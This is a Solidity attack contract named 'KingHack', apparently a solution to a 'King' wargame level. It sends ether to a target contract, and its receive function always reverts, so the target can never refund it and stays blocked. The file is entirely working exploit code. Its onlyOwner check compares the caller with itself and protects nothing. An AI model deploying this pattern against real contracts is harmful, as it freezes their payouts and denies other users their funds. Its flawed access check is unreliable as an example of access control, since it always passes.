// SPDX-License-Identifier: MIT

pragma solidity 0.8.8;

contract KingHack {

    address payable public contractAddress;
    address public owner;

    constructor(address payable  _contractAddress){
        owner = msg.sender;
        contractAddress = _contractAddress;
    }

    modifier onlyOwner(address _owner) {
        require(_owner == msg.sender, "You are not the owner");
        _;
    }

    function hack() external payable onlyOwner(msg.sender) {
        (bool success, ) = address(contractAddress).call{value: msg.value}("");
        require(success, "Failed to send eth");
    }

    receive() external payable {
        revert();
    }
}